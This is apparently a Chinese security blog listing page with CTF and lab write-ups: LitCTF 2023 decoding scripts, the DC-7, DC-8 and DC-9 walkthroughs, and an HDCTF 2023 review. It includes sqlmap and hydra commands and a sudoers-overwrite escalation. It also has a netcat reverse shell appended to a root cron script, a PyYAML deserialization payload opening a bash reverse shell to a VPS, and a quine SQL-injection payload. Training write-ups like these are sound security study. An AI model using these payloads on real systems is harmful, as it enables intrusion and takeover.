print(long_to_bytes(gmpy2.iroot(c,2)[0]))
</code></pre>
<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><p>这边主要是队友在做,队友做的我就不写了 </p>
<h2 id="OSINT-探姬去哪了-1"><a href="#OSINT-探姬去哪了-1" class="headerlink" title="OSINT 探姬去哪了?_1"></a>OSINT 探姬去哪了?_1</h2><p>图片上勉强能认清字母<br>搜索得知是松果酒店<br>然后高德搜,试了几个就对了</p>
<p>松果酒店(郑州农业路店)</p>
<h2 id="OSINT-探姬去哪了-3"><a href="#OSINT-探姬去哪了-3" class="headerlink" title="OSINT 探姬去哪了?_3"></a>OSINT 探姬去哪了?_3</h2><p>给了图cqr扫,得知是郑州轻工业大学<br>最后一定是2层-217<br>一共两个校区,来回试试<br>然后搜个楼层图一个个试,也就十几次就出了<br>科学校区-第1教学楼-2层-217</p>
<h2 id="两仪生四象-中级"><a href="#两仪生四象-中级" class="headerlink" title="两仪生四象 (中级)"></a>两仪生四象 (中级)</h2><pre><code class="python">_hash = &#123;&quot;乾&quot;: &quot;111&quot;, &quot;兑&quot;: &quot;011&quot;, &quot;离&quot;: &quot;101&quot;, &quot;震&quot;: &quot;001&quot;, &quot;巽&quot;: &quot;110&quot;, &quot;坎&quot;: &quot;010&quot;, &quot;艮&quot;: &quot;100&quot;, &quot;坤&quot;: &quot;000&quot;&#125;

_reverse_hash = &#123;v: k for k, v in _hash.items()&#125;

text = &quot;LitCTF&#123;*********&#125;&quot;

text = text[7:-1]

binary_text = &#39;&#39;.join(format(ord(c), &#39;010b&#39;) for c in text)

encoded_text = &quot;&quot;
for i in range(0, len(binary_text), 3):
    try:
        encoded_text += _reverse_hash[binary_text[i:i + 3]]
    except KeyError:
        encoded_text += &quot;&quot;

print(encoded_text)

encoded_text = &quot;坤乾兑艮兑坎坤坤巽震坤巽震艮兑坎坤震兑乾坤巽坤艮兑震巽坤巽艮坤巽艮艮兑兑艮震兑乾坤乾坤坤兑艮艮坤巽坤坤巽坎坤兑离坎震艮兑坤巽坎艮兑震坤震兑乾坤乾坎坤兑坎坤震艮离坤离乾艮震艮巽震离震坤巽兑艮兑坎坤震巽艮坤离乾艮坎离坤震巽坎坤兑坤艮兑震巽震巽坎坤巽坤艮兑兑坎震巽兑&quot; 

res = &#39;&#39;
for i in encoded_text:
    res += _hash[i]
print(res)
tem = &#39;&#39;
flag = &#39;&#39;
for i in range(len(res)):
    tem += res[i]        
    if (i+1) %  10 == 0:
        flag += chr(int(tem,2))
        tem = &#39;&#39;
print(&quot;LitCTF&#123;&quot;+flag+&quot;&#125;&quot;)
</code></pre>
<h2 id="校外-赛博算命"><a href="#校外-赛博算命" class="headerlink" title="(校外)赛博算命"></a>(校外)赛博算命</h2><p><img src="https://img-blog.csdnimg.cn/877741123fa34b1bb6f6a71999a4a387.png" alt="在这里插入图片描述"></p>
<pre><code class="python"># assert flag = &#39;LitCTF&#123;xxxxxx_xxxx_xx&#125;&#39;
#      噬嗑    渐      临      蒙      升      履 
# 未济 讼 讼 涣 益 益 夬 否 渐 涣 旅 夬 小畜 未济 
# 同人
# 001100  101001  110100                   
# L       i       t       C       T       F
# flag[i] = func_A (func_B (str[i]) + 64);
flag = &#39;&#39;
enc = []

enc.append(&#39;未济&#39;) 
enc.append(&#39;讼&#39;) 
enc.append(&#39;讼&#39;) 
enc.append(&#39;涣&#39;) 
enc.append(&#39;益&#39;) 
enc.append(&#39;益&#39;) 
enc.append(&#39;夬&#39;) 
enc.append(&#39;否&#39;) 
enc.append(&#39;渐&#39;) 
enc.append(&#39;涣&#39;) 
enc.append(&#39;旅&#39;) 
enc.append(&#39;夬&#39;) 
enc.append(&#39;小畜&#39;) 
enc.append(&#39;未济&#39;) 
print(enc)
dic = &#123;&quot;未济&quot;:&#39;101010&#39;,&quot;讼&quot;:&#39;111010&#39;,&quot;涣&quot;:&#39;110010&#39;,&quot;益&quot;:&#39;110001&#39;,&quot;夬&quot;:&#39;011111&#39;,&quot;否&quot;:&#39;111000&#39;,&quot;渐&quot;:&#39;110100&#39;,&quot;旅&quot;:&#39;101100&#39;,&quot;小畜&quot;:&#39;110111&#39;&#125;
res = &#39;&#39;
for i in enc:
    res += chr(int(dic[i],2) + 64)    
print(&#39;LitCTF&#123;&#39;+res+&#39;&#125;&#39;)
</code></pre>
<p>这里说一下思路<br>首先把字符对应的<code>LITCTF&#123;</code>   <code>&#125;</code>给去了,少写点<br>然后这些是百度找卦象的图,全的那个算1 残的那个算0<br>卦转10进制+48再转ascii就行了</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>最终排名35<br>acm出不了一点,pwn爷还在成长,总体来说大伙稍微能做点题了</p>

            
        </div>
    </div>
    <div class="post-tags">
        
        <span class="icon">
            <i class="fa-solid fa-tags fa-fw"></i>
        </span>
        
        
        
        <span class="tag">
            
            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #03a9f4">网络安全</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #00a596">安全</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/vim/" style="color: #ff7d73">vim</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="color: #00bcd4">数据库</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/%E7%BC%96%E8%BE%91%E5%99%A8/" style="color: #03a9f4">编辑器</a>
        </span>
        
    </div>
    <a href="/2023/05/14/LITCTF2023%20%E9%83%A8%E5%88%86WP/" class="go-post">阅读全文</a>
</div>

<div class="post">
    <a href="/2023/05/12/DC-9%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3/">
        <h2 class="post-title">DC-9通关详解</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2023/5/12
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img src="https://img-blog.csdnimg.cn/56a20a36ac8e480b82e5d18851b3a945.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/b658620582e5411c962472ea67afb604.png" alt="在这里插入图片描述"></p>
<h1 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h1><p><img src="https://img-blog.csdnimg.cn/b32f811cd6d24014ab4115035753b5c6.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/9e30c2bbd0cb43feac7a5b141588db74.png" alt="在这里插入图片描述"><br><code>result.php</code>处存在sql注入<br>sqlmap跑信息<br><code>python sqlmap.py -u http://192.168.45.146/results.php --data search=1 -D users -T UserDetails --dump</code><br><img src="https://img-blog.csdnimg.cn/edf34e037bbd47bca778564800424bd0.png" alt="在这里插入图片描述"><br>拿了几个尝试登录都无效<br>ssh尝试登录直接拒绝了<br>再看Staff表<br><img src="https://img-blog.csdnimg.cn/a7cc08d1f6574e4982ef50808830850b.png" alt="在这里插入图片描述"><br>查哈希<br><img src="https://img-blog.csdnimg.cn/8eafce750f1049f28a357448e42c48d0.png" alt="在这里插入图片描述"><br>进后台<br>多了一个添加记录的功能<br>没啥用,不能–os-shell</p>
<p>发现一个细节<br><img src="https://img-blog.csdnimg.cn/9c19a2dbbb374a6eacd49ab4272be15a.png" alt="在这里插入图片描述"><br>猜测是文件包含<br>猜传的值,或者bp爆破<br><img src="https://img-blog.csdnimg.cn/ba0bd48eae8b49c9b3d1119079030f0d.png" alt="在这里插入图片描述"><br>尝试php:&#x2F;&#x2F;input和日志文件包含均无果<br>然后没辙了</p>
<p>看wp得知有knock服务</p>
<p>正常应该先读<code>proc/sched_debug</code> 得知存在该服务<br><img src="https://img-blog.csdnimg.cn/5eef7917b3c040fd8bb046b15cc7f8e1.png" alt="在这里插入图片描述"><br>再读该服务的配置<br><code>/etc/knockd.conf</code><br><img src="https://img-blog.csdnimg.cn/76582fc6308547658112b614c2f99ee9.png" alt="在这里插入图片描述"></p>
<p>得知需要以此向<br>7469 8475 9842端口发syn包</p>
<p><img src="https://img-blog.csdnimg.cn/6f0b665f2a4a463d82ddf5f64eaa9c32.png" alt="在这里插入图片描述"><br>这就算打开了ssh服务了<br>再去比较之前sql注入得到的用户名和etc&#x2F;passwd下的用户名看看能否登录一个进去</p>
<p>写一个user.txt和pass.txt用hydra爆破<br>user.txt是&#x2F;etc&#x2F;passwd的下半部分<br><img src="https://img-blog.csdnimg.cn/48353f283a10492fac7c2bc80644ab11.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/94cddcbbb74140be9d77bb1167b97bf3.png" alt="在这里插入图片描述"></p>
<p><code>hydra -L user.txt  -P pass.txt ssh://192.168.45.146  -t 32</code></p>
<p><img src="https://img-blog.csdnimg.cn/99c87a30f6ae40cfb5a7646cfa127ffc.png" alt="在这里插入图片描述"></p>
<p>账号<code>janitor</code><br>密码<code>Ilovepeepee</code></p>
<p>账号<code>chandlerb</code><br>密码<code>UrAG0D!</code></p>
<p>账号<code>joeyt</code><br>密码<code>Passw0rd</code></p>
<p>登录</p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>传个LinEnum.sh过来枚举脆弱性<br>没什么可利用的<br>那一个个账户看</p>
<p>都没有sudo权限</p>
<p>在janitor下发现隐藏文件<br><img src="https://img-blog.csdnimg.cn/c90092002a5443ebb531aae3a86d9988.png" alt="在这里插入图片描述"><br>一堆密码,尝试ssh爆</p>
<p><img src="https://img-blog.csdnimg.cn/633739844e2343488f257989bfa21e4e.png" alt="在这里插入图片描述"><br>上fredf用户<br><img src="https://img-blog.csdnimg.cn/1c373a3aae174954901dc7a6b7399339.png" alt="在这里插入图片描述"><br>发现可以以root身份运行<code>/opt/devstuff/dist/test/test</code><br>那么去读源文件<br><img src="https://img-blog.csdnimg.cn/af8ed8bde084422493d27aac522004b1.png" alt="在这里插入图片描述"><br>将第一个参数的值写到第二个参数里<br>那么我们可以尝试给 当前用户所有权限<br><code>echo &#39;fredf ALL=(ALL:ALL) ALL&#39; &gt;/tmp/a.txt</code><br><code>sudo ./test /tmp/a.txt /etc/sudoers</code></p>
<p>这里我写错了给文件干烂了,直接不能sudo了</p>
<p>看了下wp后面就结束了</p>
<p>这里运行完之后执行<code>sudo su -</code>就行了<br>难顶</p>

            
        </div>
    </div>
    <div class="post-tags">
        
        <span class="icon">
            <i class="fa-solid fa-tags fa-fw"></i>
        </span>
        
        
        
        <span class="tag">
            
            <a href="/tags/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/" style="color: #00bcd4">开发语言</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #03a9f4">网络安全</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/php/" style="color: #ffa2c4">php</a>
        </span>
        
    </div>
    <a href="/2023/05/12/DC-9%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3/" class="go-post">阅读全文</a>
</div>

<div class="post">
    <a href="/2023/05/07/DC-8%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3/">
        <h2 class="post-title">DC-8通关详解</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2023/5/7
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img src="https://img-blog.csdnimg.cn/ad9c6d1a5a0647a8a98d8a70d8fccaf9.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/667d4b31d6ed48a0a0cca960bbf1889e.png" alt="在这里插入图片描述"></p>
<h1 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h1><p><img src="https://img-blog.csdnimg.cn/2d6db0eb12ea487ca8ef7ec6c561dde8.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/24d21b2114fd44108dc73d5c99b3384d.png" alt="在这里插入图片描述"><br>找个扫描器扫一下<br><img src="https://img-blog.csdnimg.cn/0f9064d91cde4a948291fd57b68c31f4.png" alt="在这里插入图片描述"><br>msf试了几个exp都没用<br>那么手动找找<br>发现传参nid出存在sql注入</p>
<p><code>python sqlmap -u &quot;http://192.168.45.144:80/?nid=1&quot; --union-cols=1 -D d7db -T users -C name,pass --columns --tables --dump</code></p>
<p><img src="https://img-blog.csdnimg.cn/915f1dd9d05b49529852b506ff4b12d5.png" alt="在这里插入图片描述"><br>用john爆密码<br>admin爆了20分钟没爆出来</p>
<p>john的密码<img src="https://img-blog.csdnimg.cn/43be3dbb4c534c05b95bf4657e132f1e.png" alt="在这里插入图片描述"><br>尝试ssh和后台登录<br>ssh进不去<br><img src="https://img-blog.csdnimg.cn/19ae6ed9931e41fcaf793252b3aa3edb.png" alt="在这里插入图片描述"><br>这里一直没打成功(当时没试着去提交),然后我就手贱给他删了…<br>自己再添加一个,提交执行<br><img src="https://img-blog.csdnimg.cn/856fd984a695448db973c2a85ad4ef5a.png" alt="在这里插入图片描述"><br>拿到shell<br><img src="https://img-blog.csdnimg.cn/dbe547d559da44d284b21ce60ab76483.png" alt="在这里插入图片描述"></p>
<h1 id="提取"><a href="#提取" class="headerlink" title="提取"></a>提取</h1><p>优化shell</p>
<pre><code class="bash">python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;
ctrl+z
stty -echo raw;fg
</code></pre>
<p>cd到&#x2F;tmp目录下<br>从vps上下载LinEnum.sh枚举脆弱性<br><img src="https://img-blog.csdnimg.cn/e3ddc9f624a74a478a2fa2dfa9ab3a43.png" alt="在这里插入图片描述"><br>发现存在exim4 看看能否尝试用这个提权<br><img src="https://img-blog.csdnimg.cn/939996e4d8d74ddf885814c42a04a948.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/5783be96cc4a4fd59de7c2124b935410.png" alt="在这里插入图片描述"><br>试了一下<code>linux/local/46996.sh</code>,失败了,返回的还是www-data<br>找了一圈没发现什么办法,看看wp<br>发现别46996.sh成功了?</p>
<p>那么再尝试一遍,scp传到vps<br>wget下载<br>发现运行报错<br><img src="https://img-blog.csdnimg.cn/44af06483f294d03a6f55490b7460d5a.png" alt="在这里插入图片描述"><br>kali用<code>dos2unix</code>转换完文件再传过去,执行<br>还是www-data</p>
<p>发现是操作问题导致的,这个默认的用法不行<br>得<code>-m netcat</code><br><img src="https://img-blog.csdnimg.cn/6969b93f7b8741d8bdd3c7443e992e84.png" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/f7d015dda6e2401484844a7d73ae6e3a.png" alt="在这里插入图片描述"></p>

            
        </div>
    </div>
    <div class="post-tags">
        
        <span class="icon">
            <i class="fa-solid fa-tags fa-fw"></i>
        </span>
        
        
        
        <span class="tag">
            
            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00bcd4">网络安全</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/linux/" style="color: #00a596">linux</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #ff7d73">安全</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/%E8%BF%90%E7%BB%B4/" style="color: #00bcd4">运维</a>
        </span>
        
    </div>
    <a href="/2023/05/07/DC-8%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3/" class="go-post">阅读全文</a>
</div>

<div class="post">
    <a href="/2023/04/30/DC-7%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3/">
        <h2 class="post-title">DC-7通关详解</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2023/4/30
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img src="https://img-blog.csdnimg.cn/856e0fdcd1034dad80369f7c6a378f8a.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/09ea3b35b6dc45dda26125567e714220.png" alt="在这里插入图片描述"></p>
<h1 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h1><p><img src="https://img-blog.csdnimg.cn/dc3aabab1bfb4ce9a8233babadef0f77.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/3351f2de5fc144339585dce86d62b872.png" alt="在这里插入图片描述"><br>web提示我们说弱口令可能不会奏效</p>
<p>那么我们就先不考虑弱口令<br>searchsploit搜payload打打看,无果</p>
<p>看别人的wp知道了是通过web左下角的这个玩意去github搜<br><img src="https://img-blog.csdnimg.cn/cb6316bea7fa424883ae46ddfda57a16.png" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/372cc29425024a9da80ae91d2737618d.png" alt="在这里插入图片描述"><br>在这个仓库用户唯一的仓库中看config.php<br>发现账号密码</p>
<p><img src="https://img-blog.csdnimg.cn/f791d54185724161a3049a294a3cee3d.png" alt="在这里插入图片描述"><br>尝试后台和ssh登录</p>
<p>ssh登录成功</p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>当前目录下发现mbox和backup文件夹<br>看看都是什么<br>backup目录下是俩挺大的压缩包<br>cat 一下mbox<br><img src="https://img-blog.csdnimg.cn/2163c3c2ce0649a1ba953b30a77f2472.png" alt="在这里插入图片描述"></p>
<p>然后看看<code>/opt/scripts/backups.sh</code></p>
<p><img src="https://img-blog.csdnimg.cn/5c3b63ddef6346ebb1ba9dd7b966a7ce.png" alt="在这里插入图片描述"><br>没什么用,我们写不了该文件,但是发现www-data组可写<br>没思路了,也不能su过去,回头看一眼wp</p>
<p>发现<code>/home/dc7user</code>目录下还存在一个<code>.drush</code>目录,当时根本没在意,没怎么见过这东西<br>drush是个命令,可以管理drupal</p>
<p>cd到&#x2F;var&#x2F;www&#x2F;html下<br><img src="https://img-blog.csdnimg.cn/5ae9faba33c4494396f89366c5c292f8.png" alt="在这里插入图片描述"></p>
<p>改admin的密码,用web弹个shell<br>和之前做的drupal的站一样,去扩展里找支持php解析的扩展,给他启用<br>发现这里没有,去下一个<br><code>https://ftp.drupal.org/files/projects/php-8.x-1.x-dev.tar.gz </code><br>装完后启用,然后写一句话反弹shell<br>优化shell</p>
<pre><code class="bash">python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;
ctrl+z
stty -echo raw;fg
</code></pre>
<p>现在有写的权限,在sh文件最后追加一个命令<br>等这个命令被root执行生成一个shell</p>
<pre><code class="bash">echo &quot;nc -e /bin/bash vps地址 9000&quot; &gt;&gt; backups.sh
</code></pre>
<p>等15分钟,每15分钟执行一次,可以用date命令查看大概差多长时间<br>最好先自己手动执行看看能不能反弹上,省得再等15分钟<br><img src="https://img-blog.csdnimg.cn/9f1e88d95e0448d4886b247e0024a40b.png" alt="在这里插入图片描述"></p>

            
        </div>
    </div>
    <div class="post-tags">
        
        <span class="icon">
            <i class="fa-solid fa-tags fa-fw"></i>
        </span>
        
        
        
        <span class="tag">
            
            <a href="/tags/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/" style="color: #03a9f4">开发语言</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ffa2c4">网络安全</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/php/" style="color: #00a596">php</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/linux/" style="color: #ffa2c4">linux</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/ssh/" style="color: #ff7d73">ssh</a>
        </span>
        
    </div>
    <a href="/2023/04/30/DC-7%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3/" class="go-post">阅读全文</a>
</div>

<div class="post">
    <a href="/2023/04/24/HDCTF%202023%20%E5%A4%8D%E7%9B%98/">
        <h2 class="post-title">HDCTF 2023 复盘</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2023/4/24
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="yamiyami"><a href="#yamiyami" class="headerlink" title="yamiyami"></a>yamiyami</h2><p>当时考虑直接读的<code>/proc/self/environ</code><br>读到flag是not_flag<br>就没考虑过<code>/proc/1/environ</code>了<br>然后不知道py3URL二次编码的特性,读不到源码,无从下手<br>做flask算pin码的题做多了,还以为pid是1的就是self,难顶</p>
<p>上面那种是非预期<br>预期是yaml反序列化</p>
<p>先读源码<br><code>/read?url=file:///%25%36%31%25%37%30%25%37%30%25%32%66%25%36%31%25%37%30%25%37%30%25%32%65%25%37%30%25%37%39</code></p>
<pre><code class="python">
#encoding:utf-8
import os
import re, random, uuid
from flask import *
from werkzeug.utils import *
import yaml
from urllib.request import urlopen
app = Flask(__name__)
random.seed(uuid.getnode())
app.config[&#39;SECRET_KEY&#39;] = str(random.random()*233)
app.debug = False
BLACK_LIST=[&quot;yaml&quot;,&quot;YAML&quot;,&quot;YML&quot;,&quot;yml&quot;,&quot;yamiyami&quot;]
app.config[&#39;UPLOAD_FOLDER&#39;]=&quot;/app/uploads&quot;

@app.route(&#39;/&#39;)
def index():
    session[&#39;passport&#39;] = &#39;YamiYami&#39;
    return &#39;&#39;&#39;
    Welcome to HDCTF2023 &lt;a href=&quot;/read?url=https://baidu.com&quot;&gt;Read somethings&lt;/a&gt;
    &lt;br&gt;
    Here is the challenge &lt;a href=&quot;/upload&quot;&gt;Upload file&lt;/a&gt;
    &lt;br&gt;
    Enjoy it &lt;a href=&quot;/pwd&quot;&gt;pwd&lt;/a&gt;
    &#39;&#39;&#39;
@app.route(&#39;/pwd&#39;)
def pwd():
    return str(pwdpath)
@app.route(&#39;/read&#39;)
def read():
    try:
        url = request.args.get(&#39;url&#39;)
        m = re.findall(&#39;app.*&#39;, url, re.IGNORECASE)
        n = re.findall(&#39;flag&#39;, url, re.IGNORECASE)
        if m:
            return &quot;re.findall(&#39;app.*&#39;, url, re.IGNORECASE)&quot;
        if n:
            return &quot;re.findall(&#39;flag&#39;, url, re.IGNORECASE)&quot;
        res = urlopen(url)
        return res.read()
    except Exception as ex:
        print(str(ex))
    return &#39;no response&#39;

def allowed_file(filename):
   for blackstr in BLACK_LIST:
       if blackstr in filename:
           return False
   return True
@app.route(&#39;/upload&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])
def upload_file():
    if request.method == &#39;POST&#39;:
        if &#39;file&#39; not in request.files:
            flash(&#39;No file part&#39;)
            return redirect(request.url)
        file = request.files[&#39;file&#39;]
        if file.filename == &#39;&#39;:
            return &quot;Empty file&quot;
        if file and allowed_file(file.filename):
            filename = secure_filename(file.filename)
            if not os.path.exists(&#39;./uploads/&#39;):
                os.makedirs(&#39;./uploads/&#39;)
            file.save(os.path.join(app.config[&#39;UPLOAD_FOLDER&#39;], filename))
            return &quot;upload successfully!&quot;
    return render_template(&quot;index.html&quot;)
@app.route(&#39;/boogipop&#39;)
def load():
    if session.get(&quot;passport&quot;)==&quot;Welcome To HDCTF2023&quot;:
        LoadedFile=request.args.get(&quot;file&quot;)
        if not os.path.exists(LoadedFile):
            return &quot;file not exists&quot;
        with open(LoadedFile) as f:
            yaml.full_load(f)
            f.close()
        return &quot;van you see&quot;
    else:
        return &quot;No Auth bro&quot;
if __name__==&#39;__main__&#39;:
    pwdpath = os.popen(&quot;pwd&quot;).read()
    app.run(
        debug=False,
        host=&quot;0.0.0.0&quot;
    )
    print(app.config[&#39;SECRET_KEY&#39;])
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/b2857d342e1b4f5997bd8746c8a30735.png" alt="在这里插入图片描述"><br>在&#x2F;boogipop路径下可触发反序列化<br>但是能进语句的条件是passport &#x3D;&#x3D; Welcome To HDCTF2023<br>那么我们需要伪造session<br><img src="https://img-blog.csdnimg.cn/71117d56ad844ab4bd9e4366600526e2.png" alt="在这里插入图片描述"></p>
<p>这是生成secret key的逻辑<br>uuid.getnode返回网卡的int值<br>那么我们去读网卡<br>&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address<br>得到<br><img src="https://img-blog.csdnimg.cn/87387918f92c416393908fe5bb4e1856.png" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/b6d45568858a46afbb5c92f79bafc15b.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/79ebe40fc43e4571b64eb607182607f2.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/f6a0ddc3caea46b19de85d0c06747c58.png" alt="在这里插入图片描述"><br>验证是否伪造成功<br><img src="https://img-blog.csdnimg.cn/ccd333e5d9924b0093964ac12a8220ac.png" alt="在这里插入图片描述"><br>成功伪造了session<br>然后我们构造恶意yaml文件<br>我这里命名为ac.ac</p>
<pre><code class="yaml">!!python/object/new:str
    args: []
    state: !!python/tuple
      - &quot;__import__(&#39;os&#39;).system(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/vps地址/9000 &lt;&amp;1\&quot;&#39;)&quot;
      - !!python/object/new:staticmethod
        args: []
        state:
          update: !!python/name:eval
          items: !!python/name:list
</code></pre>
<p>触发<br><img src="https://img-blog.csdnimg.cn/8073dd513d6d4c84b1afdd8069861534.png" alt="在这里插入图片描述"><br>这里其实就拿到shell了,由于题目环境的问题是读不了flag的,还是得通过<code>/proc/1/environ</code>读</p>
<h2 id="LoginMaster"><a href="#LoginMaster" class="headerlink" title="LoginMaster"></a>LoginMaster</h2><p>robots.txt泄露waf<br><img src="https://img-blog.csdnimg.cn/908345a883c740e59813066ded420bea.png" alt="在这里插入图片描述"><br>发现是quine查询<br>payload如下<br><code>1&#39;union/**/select/**/replace(replace(&#39;1&quot;union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#39;,char(34),char(39)),char(46),&#39;1&quot;union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#39;)#</code></p>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="math-rsa"><a href="#math-rsa" class="headerlink" title="math_rsa"></a>math_rsa</h2><p>由题<br>p^2^ ≡ a mod r<br>即a是模p的二次剩余<br>通过sage求解p</p>
<pre><code class="python">r = 145491538843334216714386412684012043545621410855800637571278502175614814648745218194962227539529331856802087217944496965842507972546292280972112841086902373612910345469921148426463042254195665018427080500677258981687116985855921771781242636077989465778056018747012467840003841693555272437071000936268768887299
a = 55964525692779548127584763434439890529728374088765597880759713360575037841170692647451851107865577004136603179246290669488558901413896713187831298964947047118465139235438896930729550228171700578741565927677764309135314910544565108363708736408337172674125506890098872891915897539306377840936658277631020650625
R.&lt;x&gt; = PolynomialRing(Zmod(r))
f = x**2 - a
print(f.roots())
</code></pre>
<pre><code class="python">from Crypto.Util.number import *
import gmpy2
n = 14859096721972571275113983218934367817755893152876205380485481243331724183921836088288081702352994668073737901001999266644597320501510110156000004121260529706467596723314403262665291609405901413014268847623323618322794733633701355018297180967414569196496398340411723555826597629318524966741762029358820546567319749619243298957600716201084388836601266780686983787343862081546627427588380349419143512429889606408316907950943872684371787773262968532322073585449855893701828146080616188277162144464353498105939650706920663343245426376506714689749161228876988380824497513873436735960950355105802057279581583149036118078489
r = 145491538843334216714386412684012043545621410855800637571278502175614814648745218194962227539529331856802087217944496965842507972546292280972112841086902373612910345469921148426463042254195665018427080500677258981687116985855921771781242636077989465778056018747012467840003841693555272437071000936268768887299
a = 55964525692779548127584763434439890529728374088765597880759713360575037841170692647451851107865577004136603179246290669488558901413896713187831298964947047118465139235438896930729550228171700578741565927677764309135314910544565108363708736408337172674125506890098872891915897539306377840936658277631020650625
c = 12162333845365222333317364738458290101496436746496440837075952494841057738832092422679700884737328562151621948812616422038905426346860411550178061478808128855882459082137077477841624706988356642870940724988156263550796637806555269282505420720558849717265491643392140727605508756229066139493821648882251876933345101043468528015921111395602873356915520599085461538265894970248065772191748271175288506787110428723281590819815819036931155215189564342305674107662339977581410206210870725691314524812137801739246685784657364132180368529788767503223017329025740936590291109954677092128550252945936759891497673970553062223608
e=65537
p = 135098300162574110032318082604507116145598393187097375349178563291884099917465443655846455456198422625358836544141120445250413758672683505731015242196083913722084539762488109001442453793004455466844129788221721833309756439196036660458760461237225684006072689852654273913614912604470081753828559417535710077291
q = n // p
phi_n = (p-1)*(q-1)
d = gmpy2.invert(e,phi_n)
print(long_to_bytes(pow(c,d,n)).decode())
</code></pre>

            
        </div>
    </div>
    <div class="post-tags">
        
        <span class="icon">
            <i class="fa-solid fa-tags fa-fw"></i>
        </span>
        
        
        
        <span class="tag">
            
            <a href="/tags/python/" style="color: #00bcd4">python</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ff7d73">网络安全</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #ffa2c4">安全</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/flask/" style="color: #00bcd4">flask</a>
        </span>
        
        <span class="tag">
            
